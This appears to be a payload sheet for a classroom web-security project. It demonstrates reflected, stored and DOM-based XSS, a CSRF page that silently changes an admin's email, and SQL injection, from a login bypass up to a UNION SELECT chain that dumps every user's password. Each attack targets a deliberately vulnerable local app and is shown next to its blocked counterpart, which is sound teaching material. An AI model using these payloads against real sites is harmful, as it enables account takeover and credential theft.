# Attack Payloads — Education Portal

Every payload used in this project, in the order the report demonstrates them.
Each one **works** on the vulnerable version (port 3000) and is **blocked** on
the safe version (port 3001). Copy a payload exactly as written.

Demo login for every attack: `admin` / `admin123`

---

## 1. Reflected XSS
**Where:** the login page's `name` field, reflected onto the welcome page.
**Payload (type into the name box):**
```
<script>alert('XSS')</script>
```
**Vulnerable:** the script runs — an alert pops up.
**Safe:** the text is shown as plain words, no alert.

---

## 2. Stored XSS
**Where:** the Comments page. The comment is saved in the database and runs for
every visitor afterwards.
**Payload (post as a comment):**
```
<script>alert('stored')</script>
```
**Vulnerable:** the alert pops up every time the comments page is opened.
**Safe:** the comment is shown as plain text.

---

## 3. DOM-based XSS
**Where:** the Greeting page, which reads whatever comes after `#` in the URL
and writes it straight into the page.
**Payload (put it in the address bar):**
```
http://localhost:3000/dom-xss#<img src=x onerror=alert('dom')>
```
**Vulnerable:** the broken-image trick fires the alert.
**Safe:** the text after `#` is shown as plain words, no alert.
(On the safe version use `http://localhost:3001/dom-xss#...`)

---

## 4. CSRF (Cross-Site Request Forgery)
**Where:** the "update email" action. A booby-trapped page silently submits it
using the victim's logged-in session.
**How:** stay logged in as admin in one tab, then open the attacker page in
another tab:
```
http://localhost:3000/csrf-attack.html
```
**Vulnerable:** the "Congratulations, you won a laptop" page stays on screen
while the admin's email is silently changed to `hacked@evil.com` in the
background. Refresh the profile page to see it changed.
**Safe:** open `http://localhost:3001/csrf-attack-safe.html` — the request is
rejected (403 Forbidden) because it has no valid CSRF token, so the email does
NOT change.

---

## 5. SQL Injection — Level 1 (Easy: login bypass)
**Where:** the login form.
**Payload:**
- Username:
```
admin' --
```
- Password: leave anything, e.g. `x`

(Or log in as any user without a password with `' OR '1'='1' --`.)

**Vulnerable:** you are logged in without the real password, because the `--`
comments out the password check.
**Safe:** login fails — the input is treated as a plain username, not SQL.

---

## 6. SQL Injection — Level 2 (Intermediate: error-based)
**Where:** the student search box.
**Payload:**
```
'
```
(a single quote)

**Vulnerable:** the page shows a raw database error (a broken SQL statement).
That error tells the attacker the query is injectable and hints at its shape.
**Safe:** no error — a single quote is treated as ordinary search text.

---

## 7. SQL Injection — Level 3 (Advanced: UNION data theft)
**Where:** the student search box. `UNION SELECT` glues the attacker's own rows
onto the search results. The search shows two columns, so each `UNION SELECT`
must also return two values.

**Stage 1 — confirm two columns / find where output shows:**
```
zzz' UNION SELECT 1,2 --
```
Vulnerable: a row showing `1 | 2` appears, proving two columns and that both are
printed. (`zzz'` makes the real search match nothing so only our row shows.)

**Stage 2 — list the tables in the database:**
```
zzz' UNION SELECT name,2 FROM sqlite_master WHERE type='table' --
```
Vulnerable: the table names appear, including `users`.

**Stage 3 — read the `users` table's structure (its column names):**
```
zzz' UNION SELECT sql,'' FROM sqlite_master WHERE name='users' --
```
Vulnerable: the `CREATE TABLE users (...)` text appears, revealing the column
names `username` and `password`.

**Stage 4 — dump the usernames and passwords:**
```
zzz' UNION SELECT username,password FROM users --
```
Vulnerable: every user's username and password is printed in the results.

**Safe (all stages):** no rows are injected and no data leaks, because the input
is passed as a plain search value to a parameterized query.

---

## Summary

| # | Attack | Vulnerable (3000) | Safe (3001) |
|---|--------|-------------------|-------------|
| 1 | Reflected XSS | Script runs | Shown as text |
| 2 | Stored XSS | Script runs for all | Shown as text |
| 3 | DOM XSS | Script runs | Shown as text |
| 4 | CSRF | Email silently changed | 403, blocked |
| 5 | SQLi login bypass | Logged in, no password | Login fails |
| 6 | SQLi error leak | DB error shown | No error |
| 7 | SQLi UNION dump | Passwords dumped | No data leaks |
